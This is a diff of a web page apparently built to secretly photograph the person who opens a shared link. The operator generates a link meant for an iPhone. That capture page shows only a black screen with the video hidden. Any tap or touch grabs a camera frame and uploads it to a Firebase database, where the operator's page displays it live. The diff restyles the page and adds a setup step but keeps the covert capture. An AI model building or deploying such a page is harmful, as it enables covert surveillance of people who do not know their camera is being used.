@@ -2,46 +2,57 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>LiveSnap Secure</title>
+  <title>Secure Snap Setup</title>
   <style>
     body {
       margin: 0;
-      background: black;
-      color: white;
       font-family: sans-serif;
       text-align: center;
     }
-    #control, #capture {
-      display: none;
+    .center {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
     }
     input, button {
       padding: 10px;
       font-size: 18px;
-      margin-top: 10px;
+      margin: 10px;
     }
     img {
       margin-top: 20px;
       max-width: 90%;
-      border: 2px solid white;
+      border: 2px solid black;
     }
-    video {
-      display: none;
+    #black {
+      background: black;
+      color: white;
     }
+    #white {
+      background: white;
+      color: black;
+    }
+    video { display: none; }
   </style>
 </head>
-<body>
+<body id="white">
 
-<!-- Control Panel (Android) -->
-<div id="control">
-  <h2>Enter Your Private Key</h2>
-  <input type="text" id="keyInput" placeholder="e.g. mypass123">
+<div id="main" class="center">
+  <h2>Enter Your Key</h2>
+  <input type="text" id="keyInput" placeholder="e.g. 112233">
+  <button onclick="goToSetup()">Next</button>
+</div>
+
+<div id="setup" class="center" style="display:none;">
+  <h2>Key: <span id="showKey"></span></h2>
   <button onclick="generateLink()">Generate Link</button>
   <p id="linkDisplay"></p>
   <img id="photo" src="" alt="Waiting for photo..." />
 </div>
 
-<!-- Capture Page (iPhone) -->
-<div id="capture" onclick="capture()" ontouchstart="capture()">
+<div id="capture" onclick="capture()" ontouchstart="capture()" style="display:none;">
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none;"></canvas>
 </div>
@@ -64,9 +75,11 @@
 
   const params = new URLSearchParams(window.location.search);
   const captureKey = params.get("capture");
+  const setupKey = params.get("setup");
 
+  // === Capture Mode (iPhone) ===
   if (captureKey) {
-    // Show capture page (iPhone)
+    document.body.id = "black";
     document.getElementById("capture").style.display = "block";
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
@@ -82,32 +95,38 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const dataUrl = canvas.toDataURL("image/jpeg");
 
-      console.log("Captured & uploading to key:", captureKey); // Debug log
-
       db.ref("livephoto/" + captureKey).set({
         image: dataUrl,
         time: Date.now()
       });
     }
-  } else {
-    // Show control panel (Android)
-    document.getElementById("control").style.display = "block";
+  }
 
-    function generateLink() {
-      const key = document.getElementById("keyInput").value.trim();
-      if (!key) return alert("Enter a valid key");
-      const link = window.location.origin + window.location.pathname + "?capture=" + encodeURIComponent(key);
-      document.getElementById("linkDisplay").innerHTML = `<b>Send this link to iPhone:</b><br><a style='color:lime' href="${link}" target="_blank">${link}</a>`;
+  // === Setup Mode (After Key Entry) ===
+  else if (setupKey) {
+    document.getElementById("main").style.display = "none";
+    document.getElementById("setup").style.display = "flex";
+    document.getElementById("showKey").textContent = setupKey;
 
-      db.ref("livephoto/" + key).on("value", snapshot => {
-        const data = snapshot.val();
-        if (data && data.image) {
-          document.getElementById("photo").src = data.image;
-        }
-      });
-    }
+    db.ref("livephoto/" + setupKey).on("value", snapshot => {
+      const data = snapshot.val();
+      if (data && data.image) {
+        document.getElementById("photo").src = data.image;
+      }
+    });
 
-    window.generateLink = generateLink;
+    window.generateLink = function () {
+      const link = window.location.origin + window.location.pathname + "?capture=" + encodeURIComponent(setupKey);
+      document.getElementById("linkDisplay").innerHTML =
+        `<b>Send this link to iPhone:</b><br><a href="${link}" target="_blank">${link}</a>`;
+    };
+  }
+
+  // === Home Page ===
+  function goToSetup() {
+    const key = document.getElementById("keyInput").value.trim();
+    if (!key) return alert("Enter a key!");
+    window.location.href = "?setup=" + encodeURIComponent(key);
   }
 </script>
 </body>
